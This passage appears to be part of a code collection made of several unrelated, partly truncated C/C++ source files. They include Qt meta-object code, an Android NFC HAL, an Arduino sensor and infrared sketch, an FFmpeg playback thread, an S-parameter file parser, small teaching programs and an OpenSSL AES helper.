static_cast<_t>(&WBFloatingPalette::mouseEntered)) {\n                *result = 0;\n                return;\n            }\n        }\n        {\n            using _t = void (WBFloatingPalette::*)(eMinimizedLocation );\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&WBFloatingPalette::minimizeStart)) {\n                *result = 1;\n                return;\n            }\n        }\n        {\n            using _t = void (WBFloatingPalette::*)();\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&WBFloatingPalette::maximizeStart)) {\n                *result = 2;\n                return;\n            }\n        }\n        {\n            using _t = void (WBFloatingPalette::*)();\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&WBFloatingPalette::maximized)) {\n                *result = 3;\n                return;\n            }\n        }\n        {\n            using _t = void (WBFloatingPalette::*)();\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&WBFloatingPalette::moving)) {\n                *result = 4;\n                return;\n            }\n        }\n    }\n}\n\nQT_INIT_METAOBJECT const QMetaObject WBFloatingPalette::staticMetaObject = { {\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\n    qt_meta_stringdata_WBFloatingPalette.data,\n    qt_meta_data_WBFloatingPalette,\n    qt_static_metacall,\n    nullptr,\n    nullptr\n} };\n\n\nconst QMetaObject *WBFloatingPalette::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *W",
    "/******************************************************************************\n *\n *  Copyright 2018 NXP\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *  http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n *\n ******************************************************************************/\n\n#define LOG_TAG \"android.hardware.nfc@1.1-impl\"\n#include <log/log.h>\n#include \"Nfc.h\"\n#include \"halimpl/inc/phNxpNciHal_Adaptation.h\"\n#include \"phNfcStatus.h\"\n\n#define CHK_STATUS(x) ((x) == NFCSTATUS_SUCCESS) \\\n      ? (V1_0::NfcStatus::OK) : (V1_0::NfcStatus::FAILED)\n\nextern bool nfc_debug_enabled;\n\nnamespace android {\nnamespace hardware {\nnamespace nfc {\nnamespace V1_1 {\nnamespace implementation {\n\nsp<V1_1::INfcClientCallback> Nfc::mCallbackV1_1 = nullptr;\nsp<V1_0::INfcClientCallback> Nfc::mCallbackV1_0 = nullptr;\n\nReturn<V1_0::NfcStatus> Nfc::open_1_1(\n    const sp<V1_1::INfcClientCallback>& clientCallback) {\n  if (clientCallback == nullptr) {\n    ALOGD_IF(nfc_debug_enabled, \"Nfc::open null callback\");\n    return V1_0::NfcStatus::FAILED;\n  } else {\n    mCallbackV1_1 = clientCallback;\n    mCallbackV1_1->linkToDeath(this, 0 /*cookie*/);\n  }\n  return open(clientCallback);\n}\n\n// Methods from ::android::hardware::nfc::V1_0::INfc follow.\nReturn<V1_0::NfcStatus> Nfc::open(\n    const sp<V1_0::INfcClientCallback>& clientCallback) {\n  ALOGD_IF(nfc_debug_enabled, \"Nfc::open Enter\");\n  if (clientCallback == nullptr) {\n    ALOGD_IF(nfc_debug_enabled, \"Nfc::open null callback\");\n    return V1_0::NfcStatus::FAILED;\n  } else {\n    mCallbackV1_0 = clientCallback;\n    mCallbackV1_0->linkToDeath(this, 0 /*cookie*/);\n  }\n\n  NFCSTATUS status = phNxpNciHal_open(eventCallback, dataCallback);\n  ALOGD_IF(nfc_debug_enabled, \"Nfc::open Exit\");\n  return CHK_STATUS(status);\n}\n\nReturn<uint32_t> Nfc::write(const hidl_vec<uint8_t>& data) {\n  hidl_vec<uint8_t> copy = data;\n  return phNxpNciHal_write(copy.size(), &copy[0]);\n}\n\nReturn<V1_0::NfcStatus> Nfc::coreInitialized(const hidl_vec<uint8_t>& data) {\n  hidl_vec<uint8_t> copy = data;\n  NFCSTATUS status = phNxpNciHal_core_initialized(copy.size(), &copy[0]);\n  return CHK_STATUS(status);\n}\n\nReturn<V1_0::NfcStatus> Nfc::prediscover() {\n  NFCSTATUS status = phNxpNciHal_pre_discover();\n  return CHK_STATUS(status);\n}\n\nReturn<V1_0::NfcStatus> Nfc::close() {\n  if (mCallbackV1_1 == nullptr && mCallbackV1_0 == nullptr) {\n    return V1_0::NfcStatus::FAILED;\n  }\n  NFCSTATUS status = phNxpNciHal_close(false);\n\n  if (mCallbackV1_1 != nullptr) {\n    mCallbackV1_1->unlinkToDeath(this);\n    mCallbackV1_1 = nullptr;\n  }\n  if (mCallbackV1_0 != nullptr) {\n    mCallbackV1_0->unlinkToDeath(this);\n    mCallbackV1_0 = nullptr;\n  }\n  return CHK_STATUS(status);\n}\n\nReturn<V1_0::NfcStatus> Nfc::controlGranted() {\n  NFCSTATUS status = phNxpNciHal_control_granted();\n  return CHK_STATUS(status);\n}\n\nReturn<V1_0::NfcStatus> Nfc::powerCycle() {\n  NFCSTATUS status = phNxpNciHal_power_cycle();\n  return CHK_STATUS(status);\n}\n\n// Methods from ::android::hardware::nfc::V1_1::INfc follow.\nReturn<void> Nfc::factoryReset() {\n  phNxpNciHal_do_factory_reset();\n  return Void();\n}\n\nReturn<V1_0::NfcStatus> Nfc::closeForPowerOffCase() {\n  if (mCallbackV1_1 == nullptr && mCallbackV1_0 == nullptr) {\n    return V1_0::NfcStatus::FAILED;\n  }\n  NFCSTATUS status = phNxpNciHal_configDiscShutdown();\n\n  if (mCallbackV1_1 != nullptr) {\n    mCallbackV1_1->unlinkToDeath(this);\n    mCallbackV1_1 = nullptr;\n  }\n  if (mCallbackV1_0 != nullptr) {\n    mCallbackV1_0->unlinkToDeath(this);\n    mCallbackV1_0 = nullptr;\n  }\n  return CHK_STATUS(status);\n}\n\nReturn<void> Nfc::getConfig(getConfig_cb hidl_cb) {\n  NfcConfig nfcVendorConfig;\n  phNxpNciHal_getVendorConfig(nfcVendorConfig);\n  hidl_cb(nfcVendorConfig);\n  return Void();\n}\n\n}  // namespace implementation\n}  // namespace V1_1\n}  // namespace nfc\n}  // namespace hardware\n}  // namespace android\n",
    "#include <Arduino.h>\n#include <dht.h>\n#include <IRremoteESP8266.h>\n#include <IRrecv.h>\n#include <IRutils.h>\n#include <IRsend.h>\n\n/* \"\"\"\"\"\"Sensor de Temperatura Secion\"\"\"\"\"\" */\n//DEFINI\u00c7\u00c3O DE PINOS\n#define pinSensor 4\n\n//INTERVALO DE LEITURA\n#define intervalo 5000\n\n//CRIANDO VARIAVEIS E INSTANCIANDO OBJETOS\nunsigned long delayIntervalo;\ndht sensorDHT;\n\n\n/* \"\"\"\"\"\"Recetor Infravermelho Secion\"\"\"\"\"\" */\nconst uint16_t kRecvPin = 14;\nIRrecv irrecv(kRecvPin);\ndecode_results results;\n\n\n/* \"\"\"\"\"\"Emissor Infravermelho Secion\"\"\"\"\"\" */\nconst uint16_t kIrLed = 5;\nIRsend irsend(kIrLed);\n\n\n// Declara\u00e7\u00e3o das fun\u00e7\u00f5es das tarefas\nvoid Task1(void *pvParameters);\nvoid Task2(void *pvParameters);\nvoid Task3(void *pvParameters);\n\nvoid setup() {\n  // Inicializa\u00e7\u00e3o do monitor serial\n  Serial.begin(115200);\n\n  irsend.begin();\n\n  irrecv.enableIRIn();\n  while (!Serial)  // Wait for the serial connection to be establised.\n    delay(50);\n  Serial.println();\n  Serial.print(\"IRrecvDemo is now running and waiting for IR message on Pin \");\n  Serial.println(kRecvPin);\n  \n  //IMPRIMINDO INFORMA\u00c7\u00d5ES SOBRE A BIBLIOTECA\n  Serial.print(\"VERSAO DA BIBLIOTECA: \");\n  Serial.println(DHT_LIB_VERSION);\n  Serial.println();\n  // Serial.println(\"Status,\\tTempo(uS),\\tUmidade(%),\\tTemperatura(C)\");\n\n  // Cria\u00e7\u00e3o das tarefas\n  xTaskCreate(\n    Task1,   // Fun\u00e7\u00e3o da tarefa\n    \"Task 1\", // Nome da tarefa\n    1000,    // Tamanho da pilha\n    NULL,    // Par\u00e2metro para a tarefa\n    1,       // Prioridade da tarefa\n    NULL);   // Handle da tarefa\n\n  xTaskCreate(\n    Task2,   // Fun\u00e7\u00e3o da tarefa\n    \"Task 2\", // Nome da tarefa\n    10000,    // Tamanho da pilha\n    NULL,    // Par\u00e2metro para a tarefa\n    1,       // Prioridade da tarefa\n    NULL);   // Handle da tarefa\n\n  xTaskCreate(\n    Task3,   // Fun\u00e7\u00e3o da tarefa\n    \"Task 3\", // Nome da tarefa\n    10000,    // Tamanho da pilha\n    NULL,    // Par\u00e2metro para a tarefa\n    1,       // Prioridade da tarefa\n    NULL);   // Handle da tarefa\n}\n\nvoid loop() {\n  // O loop pode ficar vazio, pois as tarefas est\u00e3o sendo gerenciadas pelo FreeRTOS\n}\n\n// Medidor de Temperatura\nvoid Task1(void *pvParameters) {\n  while (1) {\n    // Serial.println(\"Task 1 is running\");\n\n    if ( (millis() - delayIntervalo) > intervalo ) {\n      //LEITURA DOS DADOS\n      unsigned long start = micros();\n      int chk = sensorDHT.read22(pinSensor);\n      unsigned long stop = micros();\n\n      Serial.println(\"\\nStatus,\\tTempo(uS),\\tUmidade(%),\\tTemperatura(C)\");\n  \n      // VERIFICA SE HOUVE ERRO\n      switch (chk)\n      {\n      case DHTLIB_OK:\n          Serial.print(\"OK,\\t\");\n          break;\n      case DHTLIB_ERROR_CHECKSUM:\n          Serial.print(\"Checksum error,\\t\");\n          break;\n      case DHTLIB_ERROR_TIMEOUT:\n          Serial.print(\"Time out error,\\t\");\n          break;\n      case DHTLIB_ERROR_CONNECT:\n          Serial.print(\"Connect error,\\t\");\n          break;\n      case DHTLIB_ERROR_ACK_L:\n          Serial.print(\"Ack Low error,\\t\");\n          break;\n      case DHTLIB_ERROR_ACK_H:\n          Serial.print(\"Ack High error,\\t\");\n          break;\n      default:\n          Serial.print(\"Unknown error,\\t\");\n          break;\n      }\n  \n\n      // EXIBINDO DADOS LIDOS\n      Serial.print(stop - start);\n      Serial.print(\", \\t\\t\");\n      Serial.print(sensorDHT.humidity, 1 /*FORMATA\u00c7\u00c3O PARA UMA CASA DECIMAL*/);\n      Serial.print(\",\\t\\t\");\n      Serial.println(sensorDHT.temperature, 1 /*FORMATA\u00c7\u00c3O PARA UMA CASA DECIMAL*/);\n\n      delayIntervalo = millis();\n    };\n\n    vTaskDelay(1000 / portTICK_PERIOD_MS); // Delay de 1 segundo\n  }\n}\n\n// Receptor Infravermelho\nvoid Task2(void *pvParameters) {\n  while (1) {\n    // Serial.println(\"Task 2 is running\");\n\n    if (irrecv.decode(&results)) {\n        // print() & println() can't handle printing long longs. (uint64_t)\n        serialPrintUint64(results.value, HEX);\n        Serial.println(\"\");\n        irrecv.resume();  // Receive the next value\n      }\n      delay(100);\n\n//    vTaskDelay(2000 / portTICK_PERIOD_MS); // Delay de 2 segundos\n  }\n}\n\n// Emissor Infravermelho\nvoid Task3(void *pvParameters) {\n\n  while (1) {\n\n    Serial.println(\"Botao apertado!\");\n    irsend.sendNEC(0x57E3E817);\n    delay(2000);\n\n  }\n  \n}\n",
    "#include \"VideoThread.h\"\n#include\"SLogger.h\"\n#include\"SFFmpeg.h\"\n#include\"SAudioPlay.h\"\n#include<list>\n#include<queue>\n\nstatic std::queue<AVPacket,std::list<AVPacket>>videoPkts;\t//\u89c6\u9891\u7f13\u51b2\u961f\u5217\nstatic int apts = 0;\n\nvoid VideoThread::start()\n{\n\tstop();\n\tstd::lock_guard<std::mutex>lock(this->m_mutex);\n\tm_thread = new(std::nothrow) std::thread(&VideoThread::run, this);\n\tif (!m_thread) {\n\t\tLOG_ERROR(\"thread start failed\");\n\t\treturn;\n\t}\n\tthis->m_abort = false;\n}\n\nvoid VideoThread::stop()\n{\n\tstd::lock_guard<std::mutex>lock(this->m_mutex);\n\tif (this->m_thread) {\n\t\tthis->m_abort = true;\n\t\t//\u7b49\u5f85\u7ebf\u7a0b\u5173\u95ed\n\t\tif (this->m_thread->joinable())\n\t\t\tthis->m_thread->join();\n\t\t//\u91ca\u653e\u7ebf\u7a0b\n\t\tdelete this->m_thread;\n\t\tthis->m_thread = nullptr;\n\n\t}\n}\n\nvoid VideoThread::run()    \n{\n\tchar buf[10000] = { 0 };\n\twhile (!this->m_abort) {\n\t\t//LOG_INFO(\"thread %p \", std::this_thread::get_id());\n\n\t\tif (!SFFmpeg::instance().isPlay()) {\n\t\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(100));\n\t\t\tcontinue;\n\t\t}\n\n\t\t//\u5224\u65ad\u89c6\u9891\u961f\u5217\u662f\u5426\u4e3a\u7a7a\n\t\twhile(!videoPkts.empty()) {\n\t\t\tAVPacket pkt = videoPkts.front();\n\t\t\t//\u83b7\u53d6 pkt \u7684pts\n\t\t\tauto pts = SFFmpeg::instance().packetPts(pkt);\n\t\t\t//\u5982\u679c\u89c6\u9891\u7684pts\u5927\u4e8e\u4e86\u97f3\u9891\u7684pts \n\t\t\tif (pts > apts)break;\n\t\t\tSFFmpeg::instance().decode(&pkt);\n\t\t\tav_packet_unref(&pkt);\n\t\t\tvideoPkts.pop();\n\t\t}\n\n\t\t//\u5224\u65ad\u7a7a\u95f2\u7a7a\u95f4\u662f\u5426\u8db3\u591f\n\t\tif (SAudioPlay::instance()->bytesFree() < 10000) {\n\t\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(100));\n\t\t\tcontinue;\n\t\t}\n\n\t\tAVPacket pkt = SFFmpeg::instance().read();\n\t\t//\u8bfb\u53d6\u5305\u5931\u8d25\n\t\tif (pkt.size == 0) {\n\t\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(10));\n\t\t\tcontinue;\n\t\t}\n\t\t\n\t\t//\u64ad\u653e\u97f3\u89c6\u9891\n\t\tif (pkt.stream_index == SFFmpeg::instance().audioIndex()) {\n\t\t\t//\u89e3\u7801\n\t\t\tapts = SFFmpeg::instance().decode(&pkt);\n\t\t\tav_packet_unref(&pkt);\n\t\t\tint out_cnt = 0;\n\t\t\tif (SFFmpeg::instance().toPCM(buf, &out_cnt)) {\n\t\t\t\tSAudioPlay::instance()->write(buf, out_cnt);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tLOG_ERROR(\"to pcm failed\");\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n\t\telse if (pkt.stream_index == SFFmpeg::instance().videoIndex()) {\n\t\t\t//\u89e3\u7801\n\t\t\t//SFFmpeg::instance().decode(&pkt);\n\t\t\t//av_packet_unref(&pkt);\n\t\t\tvideoPkts.push(pkt);\n\t\t\tcontinue;\n\t\t}\n\t\t//\u7761\u7720 \u6bcf\u4e00\u5e27\u6d88\u8017\u7684\u65f6\u95f4\uff08\u6beb\u79d2\uff09\n\t\t//std::this_thread::sleep_for(std::chrono::milliseconds(\n\t\t//static_cast<long long>(1000 / SFFmpeg::instance().fps())));\n\n\t}\n}\n",
    "#include <bits/stdc++.h>\n#include <dirent.h>\nusing namespace std;\ntypedef long long ll;\ntypedef pair<ll,ll> pll;\ntypedef pair<int, int> pii;\n#define pub push_back\n#define mp make_pair\n#define pob pop_back\n#define X first\n#define Y second\n#define out '\\n'\nconst ll INF = 0x3f3f3f3f3f3f3f3f;\nconst int inf=0x3f3f3f3f;\n\nstruct SParameter{\n\tdouble freq;\n\tpair <double, double> s11;\n\tpair <double, double> sx1;\n\tpair <double, double> s1x;\n\tpair <double, double> sxx;\n\tdouble stype1val, stype2val, stype3val, stype4val;\n};\n\nvector<SParameter> data;\nvector<string> filename;\nint type, unit;\nstring stype1, stype2, stype3, stype4;\n\nvoid list_files_in_directory(const string& path) {\n\tfilename.clear();\n    DIR *dir;\n    struct dirent *ent;\n    int filecount=0;\n    if ((dir = opendir(path.c_str())) != NULL) {\n        // Iterate through the directory entries\n        while ((ent = readdir(dir)) != NULL) {\n            string file_name = ent->d_name;\n            // Check if the file name ends with \".s2p\"\n            if (file_name.size() >= 4 && file_name.substr(file_name.size() - 4) == \".s2p\") {\n                filecount++;\n                cout << filecount<<\": \"<<file_name << endl;\n                filename.pub(file_name);\n            }\n        }\n        closedir(dir);\n    } else {\n        // Could not open directory\n        perror(\"Could not open directory\");\n    }\n}\n\nbool stringToDouble(string& str, double& result) {\n    std::stringstream ss(str);\n    ss >> result;\n    return !ss.fail() && ss.eof(); // Ensure entire string was converted\n}\n\ninline void ltrim(string &s) {\n    s.erase(s.begin(), find_if(s.begin(), s.end(), [](unsigned char ch) {\n        return !isspace(ch);\n    }));\n}\n\nvoid solve(string filename){\n\tdata.clear();\n\tvector<string> nums;\n\ttype=0;\n\twhile (data.size()){\n\t\tdata.pob();\n\t}\n\tifstream input(filename);\n\tif (!input.is_open()){\n\t\tcout<<\"Error opening file or couldn't find file\"<<out;\n\t\treturn;\n\t}\n\tstring line, s; //line is the read line, and nums stores the values\n\twhile(getline(input, line)){//extract input to lines\n\t\tltrim(line);\n\t\t//cout<<line<<out;\n\t\tnums.clear();\n\t\tSParameter tmp;\n\t\t//after stores the line after replacing spaces with tabs\n\t\tif (!isdigit(line[0])){\n\t\t\ttransform(line.begin(), line.end(), line.begin(), ::tolower);\n\t\t\tsize_t found=line.find(\"freq\");\n\t\t\tif (found != string::npos){\n\t\t\t\tfound = line.find(\"mag\");\n\t\t\t\tif (found != string::npos){\n\t\t\t\t\ttype=1;\n\t\t\t\t}\n\t\t\t\tfound = line.find(\"db\");\n\t\t\t\tif (found != string::npos){\n\t\t\t\t\ttype=2;\n\t\t\t\t}\n\t\t\t\tfound = line.find(\"im\");\n\t\t\t\tif (found != string::npos){\n\t\t\t\t\ttype=3;\n\t\t\t\t}\n\t\t\t\tint current=0;\n\t\t\t\tstring ttmp;\n\t\t\t\tfor (int i=0; i<line.size(); ++i){\n\t\t\t\t\tif (line[i]=='s'){\n\t\t\t\t\t\tif (current==0){\n\t\t\t\t\t\t\tstype1+=line[i];\n\t\t\t\t\t\t\tstype1+=line[i+1];\n\t\t\t\t\t\t\tstype1+=line[i+2];\n\t\t\t\t\t\t\tttmp=line.substr(i,3);\n\t\t\t\t\t\t\tcurrent++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (current==1){\n\t\t\t\t\t\t\tif (line.substr(i,3)==stype1)\n\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\tstype2+=line[i];\n\t\t\t\t\t\t\tstype2+=line[i+1];\n\t\t\t\t\t\t\tstype2+=line[i+2];\n\t\t\t\t\t\t\tcurrent++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (current==2){\n\t\t\t\t\t\t\tif (line.substr(i,3)==stype2)\n\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\tstype3+=line[i];\n\t\t\t\t\t\t\tstype3+=line[i+1];\n\t\t\t\t\t\t\tstype3+=line[i+2];\n\t\t\t\t\t\t\tcurrent++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse{\n\t\t\t\t\t\t\tif (line.substr(i,3)==stype3)\n\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\tif (stype4!=\"\")\n\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\tstype4+=line[i];\n\t\t\t\t\t\t\tstype4+=line[i+1];\n\t\t\t\t\t\t\tstype4+=line[i+2];\n\t\t\t\t\t\t\tcurrent++;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tfound=line.find(\"khz\");\n\t\t\tif (found != string::npos){\n\t\t\t\tunit=1000;\n\t\t\t}\n\t\t\tfound=line.find(\"mhz\");\n\t\t\tif (found != string::npos){\n\t\t\t\tunit=1000000;\n\t\t\t}\n\t\t\tfound=line.find(\"ghz\");\n\t\t\tif (found != string::npos){\n\t\t\t\tunit=1000000000;\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n\t\tif (stype1==\"\" && !isdigit(line[0])){\n\t\t\tint current=0;\n\t\t\tfor (int i=0; i<line.size(); ++i){\n\t\t\t\tif (line[i]=='s' && i+2<line.size()){\n\t\t\t\t\tif (current==0){\n\t\t\t\t\t\tstype1+=line[i];\n\t\t\t\t\t\tstype1+=line[i+1];\n\t\t\t\t\t\tstype1+=line[i+2];\n\t\t\t\t\t}\n\t\t\t\t\telse if (current==1){\n\t\t\t\t\t\tstype2+=line[i];\n\t\t\t\t\t\tstype2+=line[i+1];\n\t\t\t\t\t\tstype2+=line[i+2];\n\t\t\t\t\t}\n\t\t\t\t\telse if (current==2){\n\t\t\t\t\t\tstype3+=line[i];\n\t\t\t\t\t\tstype3+=line[i+1];\n\t\t\t\t\t\tstype3+=line[i+2];\n\t\t\t\t\t}\n\t\t\t\t\telse{\n\t\t\t\t\t\tstype4+=line[i];\n\t\t\t\t\t\tstype4+=line[i+1];\n\t\t\t\t\t\tstype4+=line[i+2];\n\t\t\t\t\t}\n\t\t\t\t\tcurrent++;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif (!type){\n\t\t\tcout<<\"no file format found, please enter data type\"<<out;\n\t\t\tcout<<\"Mag+Ang press 1\"<<out;\n\t\t\tcout<<\"dB+Ang press 2\"<<out;\n\t\t\tcout<<\"Re+Im press 3\"<<out;\n\t\t\tcin>>type;\n\t\t}\n\t\tstringstream ss(line);\n\t\twhile (ss>>s){\n\t\t\tnums.pub(s);\n\t\t}\n\t\tfor (int i=0; i<nums.size(); ++i){\n\t\t\tif (nums[i].size()==0){\n\t\t\t\tnums.erase(nums.begin()+i);\n\t\t\t\ti-=1;\n\t\t\t}\n\t\t}\n\t\t//cout<<\"line size \"<<nums.size()<<out;\n\t\tif (!nums.size())\n\t\t\tcout<<\"line extraction error\"<<out;\n\t\tstringToDouble(nums[0], tmp.freq);\n\t\tstringToDouble(nums[1], tmp.s11.X);\n\t\tstringToDouble(nums[2], tmp.s11.Y);\n\t\tstringToDouble(nums[3], tmp.sx1.X);\n\t\tstringToDouble(nums[4], tmp.sx1.Y);\n\t\tstringToDouble(nums[5], tmp.s1x.X);\n\t\tstringToDouble(nums[6], tmp.s1x.Y);\n\t\ts",
    "#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nclass Persona {\r\nprivate:\r\n    string nombre;\r\n    int edad;\r\npublic:\r\n    Persona(string, int);\r\n    void mostrarPersona();\r\n};\r\n\r\nclass Trabajador : public Persona {\r\nprivate:\r\n    string cuil;\r\n    string titulo;\r\npublic:\r\n\tTrabajador(string, int, string, string);\r\n    void mostrarTrabajador();\r\n};\r\n\r\nPersona::Persona(string _nombre, int _edad) {\r\n    nombre = _nombre;\r\n    edad = _edad;\r\n}\r\n\r\nTrabajador::Trabajador(string _nombre, int _edad, string _cuil, string _titulo) \r\n    : Persona(_nombre, _edad) {\r\n    cuil = _cuil;\r\n    titulo = _titulo;\r\n}\r\n\r\nvoid Persona::mostrarPersona() {\r\n    cout << \"Nombre: \" << nombre << endl;\r\n    cout << \"Edad: \" << edad << endl;\r\n}\r\n\r\nvoid Trabajador::mostrarTrabajador() {\r\n    mostrarPersona();\r\n    cout << \"Cuil: \" << cuil << endl;\r\n    cout << \"Titulo: \" << titulo << endl;\r\n}\r\n\r\nint main() {\r\n    Trabajador trabajador1(\"Silvana\", 38, \"9038130948\", \"matematica\");\r\n    trabajador1.mostrarTrabajador();\r\n    cout << \"------------------------------------------------\" << endl;\r\n    Trabajador trabajador2(\"Jeremias\", 37, \"19023849023\", \"lenguaje\");\r\n    trabajador2.mostrarTrabajador();\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include \"MYSQL_Income.h\"\n#include \"MYSQL_Expense.h\"\n#include \"DbFunction_Income.h\"\n#include \"DbFunction_Expense.h\"\n#include \"TotalFunction.h\"\n\nusing namespace std;\n\nint main() {\n\tDbFunction_Income DbIncome;\n\tDbFunction_Expense DbExpense;\n\tTotalFunction totalFunc;\n\n\tint n1, n2;\n;\n\tDbIncome.inconnect();\n\tDbExpense.connect();\n\ttotalFunc.inconnect();\n\ttotalFunc.connect();\n\tDbIncome.show_Income();\n\tDbExpense.show_Expense();\n\n\tcout << \"---\uc6d0\ud558\uc2dc\ub294 \uae30\ub2a5\uc744 \uc120\ud0dd\ud558\uc138\uc694---\" << endl;\n\tcout << \"1. \uc785\ub825\ud558\uae30\\t\\t\" << \"2. \uc0ad\uc81c\ud558\uae30\" << endl << \"3. \uc218\uc815\ud558\uae30\\t\\t\" << \"4. \uac80\uc0c9\ud558\uae30\" << endl << \"5. \ubd84\uc11d \ubcf4\uace0\uc11c \ud655\uc778\\t\" << \"6. \uc885\ub8cc\" << \"\\n\\n\";\n\tcin >> n1;\n\n\tswitch (n1) {\n\tcase 1:\n\t\tcout << \"1. \uc218\uc785\ub0b4\uc5ed \uc785\ub825\ud558\uae30\\t\\t\" << \"2. \uc9c0\ucd9c\ub0b4\uc5ed \uc785\ub825\ud558\uae30\" << endl;\n\t\tcin >> n2;\n\t\tcout << endl;\n\t\tif (n2 == 1) {\n\t\t\tDbIncome.add_Income();\n\t\t\tbreak;\n\t\t}\n\t\telse if (n2 == 2) {\n\t\t\tDbExpense.add_Expense();\n\t\t\tbreak;\n\t\t}\n\t\telse {\n\t\t\tcout << \"\uc54c\ub9de\uc740 \uc22b\uc790\ub97c \uc785\ub825\ud558\uc138\uc694.\" << endl;\n\t\t\tbreak;\n\t\t}\n\tcase 2:\n\t\tcout << \"1. \uc218\uc785\ub0b4\uc5ed \uc0ad\uc81c\ud558\uae30\\t\\t\" << \"2. \uc9c0\ucd9c\ub0b4\uc5ed \uc0ad\uc81c\ud558\uae30\" << \"\\n\\n\";\n\t\tcin >> n2;\n\t\tif (n2 == 1) {\n\t\t\tDbIncome.delete_Income();\n\t\t\tbreak;\n\t\t}\n\t\telse if (n2 == 2) {\n\t\t\tDbExpense.delete_Expense();\n\t\t\tbreak;\n\t\t}\n\t\telse {\n\t\t\tcout << \"\uc54c\ub9de\uc740 \uc22b\uc790\ub97c \uc785\ub825\ud558\uc138\uc694.\" << endl;\n\t\t\tbreak;\n\t\t}\n\tcase 3:\n\t\tcout << \"1. \uc218\uc785\ub0b4\uc5ed \uc218\uc815\ud558\uae30\\t\\t\" << \"2. \uc9c0\ucd9c\ub0b4\uc5ed \uc218\uc815\ud558\uae30\" << \"\\n\\n\";\n\t\tcin >> n2;\n\t\tif (n2 == 1) {\n\t\t\tDbIncome.update_Income();\n\t\t\tbreak;\n\t\t}\n\t\telse if (n2 == 2) {\n\t\t\tDbExpense.update_Expense();\n\t\t\tbreak;\n\t\t}\n\t\telse {\n\t\t\tcout << \"\uc54c\ub9de\uc740 \uc22b\uc790\ub97c \uc785\ub825\ud558\uc138\uc694.\" << endl;\n\t\t\tbreak;\n\t\t}\n\tcase 4:\n\t\tcout << \"1. \ud56d\ubaa9\uc73c\ub85c \uac80\uc0c9\ud558\uae30\\t\\t\" << \"2. \ub0a0\uc9dc\ub85c \uac80\uc0c9\ud558\uae30\" << \"\\n\\n\";\n\t\tcin >> n2;\n\t\tif (n2 == 1) {\n\t\t\ttotalFunc.search_name();\n\t\t\tbreak;\n\t\t}\n\t\telse if (n2 == 2) {\n\t\t\ttotalFunc.search_date();\n\t\t\tbreak;\n\t\t}\n\t\telse {\n\t\t\tcout << \"\uc54c\ub9de\uc740 \uc22b\uc790\ub97c \uc785\ub825\ud558\uc138\uc694.\" << endl;\n\t\t\tbreak;\n\t\t}\n\tcase 5:\n\t\ttotalFunc.report();\n\t\tbreak;\n\tcase 6:\n\t\tcout << \"\ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud569\ub2c8\ub2e4.\" << endl;\n\t\tbreak;\n\tdefault:\n\t\tcout << \"\uc54c\ub9de\uc740 \uc22b\uc790\ub97c \uc785\ub825\ud558\uc138\uc694.\" << endl;\n\t\tbreak;\n\t}\n\n\treturn 0;\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <openssl/aes.h>\r\n#include <openssl/rand.h>\r\n\r\n// Function to generate a random AES key\r\nvoid generateAESKey(unsigned char* key, int length) {\r\n    if (!RAND_bytes(key, length)) {\r\n        std::cerr << \"Error generating random AES key.\" << std::endl;\r\n        exit(EXIT_FAILURE);\r\n    }\r\n}\r\n\r\n// Function to encrypt data using AES\r\nvoid encryptAES(const unsigned char* key, const unsigned char* iv, const std::string& plaintext, std::string& ciphertext) {\r\n    AES_KEY encryptKey;\r\n    AES_set_encrypt_key(key, 128, &encryptKey);\r\n\r\n    unsigned char buffer[AES_BLOCK_SIZE];\r\n    int num = 0;\r\n    int plaintextLen = plaintext.length();\r\n    ciphertext.resize(plaintextLen + AES_BLOCK_SIZE);\r\n\r\n    AES_cfb128_encrypt(reinterpret_cast<const unsigned char*>(plaintext.c_str()), reinterpret_cast<unsigned char*>(&ciphertext[0]), plaintextLen, &encryptKey, const_cast<unsigned char*>(iv), &num, AES_ENCRYPT);\r\n}\r\n\r\n// Function to decrypt data using AES\r\nvoid decryptAES(const unsigned char* key, const unsigned char* iv, const std::string& ciphertext, std::string& plaintext) {\r\n    AES_KEY decryptKey;\r\n    AES_set_encrypt_key(key, 128, &decryptKey);\r\n\r\n    unsigned char buffer[AES_BLOCK_SIZE];\r\n    int num = 0;\r\n    int ciphertextLen = ciphertext.length();\r\n    plaintext.resize(ciphertextLen);\r\n\r\n    AES_cfb128_encrypt(reinterpret_cast<const unsigned char*>(ciphertext.c_str()), reinterpret_cast<unsigned char*>(&plaintext[0]), ciphertextLen, &decryptKey, const_cast<unsigned char*>(iv), &num, AES_DECRYPT);\r\n}\r\n\r\n// Function to write binary data to a file\r\nvoid 